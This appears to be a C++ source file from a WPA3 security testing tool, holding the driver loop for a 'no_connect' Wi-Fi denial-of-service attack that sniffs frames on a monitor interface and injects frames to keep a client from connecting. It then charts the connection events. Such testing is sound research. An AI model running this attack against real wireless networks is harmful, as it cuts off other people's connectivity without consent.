#include "attacks/DoS_hard/no_connect/no_connect_helpers.h"

#include <algorithm>
#include <chrono>
#include <memory>
#include <pcap/pcap.h>
#include <vector>

#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "attacks/components/setup_connections.h"
#include "attacks/components/sniffer_helper.h"
#include "interrupt.h"
#include "logger/log.h"
#include "observer/graph/graph_elements.h"
#include "observer/resource_checker.h"

using namespace std;
using namespace chrono;

namespace wpa3_tester::no_connect {

void run_attack(RunStatus &rs, const string &filter, const string &log_msg, InjectFn inject_fn) {
	const auto &att_cfg   = rs.config().at("attack_config");
	const int attack_time = att_cfg.at("attack_time_sec").get<int>();

	const ActorPtr attacker = rs.get_actor("attacker");
	const ActorPtr ap       = rs.get_actor("ap");
	const string mon_iface  = attacker.get_mon_iface();

	attacker->set_mon_channel(ap->get_channel());

	auto [fd, sock_addr] = bl0ck_attack::get_unblocking_socket(mon_iface);
	struct FdGuard { int fd; ~FdGuard() { ::close(fd); } } const fd_guard{fd};

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(mon_iface.c_str(), 2000, 1, 100, errbuf);
	if(!handle) throw run_err("pcap_open_live failed: " + string(errbuf));
	const auto handle_guard = unique_ptr<pcap_t, void(*)(pcap_t*)>(handle, pcap_close);

	bpf_program fp{};
	if(pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) != 0)
		log(LogLevel::WARNING, "BPF compile failed ({}): {}", filter, pcap_geterr(handle));
	else
		pcap_setfilter(handle, &fp);
	pcap_freecode(&fp);

	// start_observers + sleep BEFORE setup_STA: wpa_supplicant starts scanning only
	// when the injection loop is already running, eliminating the unprotected first attempt
	rs.start_observers();
	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	rs.process_manager.write_log_all(ATTACK_START_tag);
	log(LogLevel::INFO, "{} on {}", log_msg, mon_iface);

	components::setup_STA(rs, "client");

	const auto end_time = steady_clock::now() + seconds(attack_time);
	while(steady_clock::now() < end_time) {
		const auto remaining_ms = duration_cast<milliseconds>(end_time - steady_clock::now()).count();
		if(remaining_ms <= 0) break;

		const auto result = components::poll_sniffer<bool>(
			handle,
			milliseconds(min(remaining_ms, 100L)),
			[&](const frame_raw_t &frame) -> optional<bool> {
				return inject_fn(frame, fd, sock_addr);
			});

		if(holds_alternative<StopReason>(result) &&
		   get<StopReason>(result) == StopReason::Interrupted)
			throw interrupted_err("no_connect loop");
	}

	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));

	rs.get_actor("client")->disconnect();
	ap->disconnect();
}

void stats_attack(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
}
}
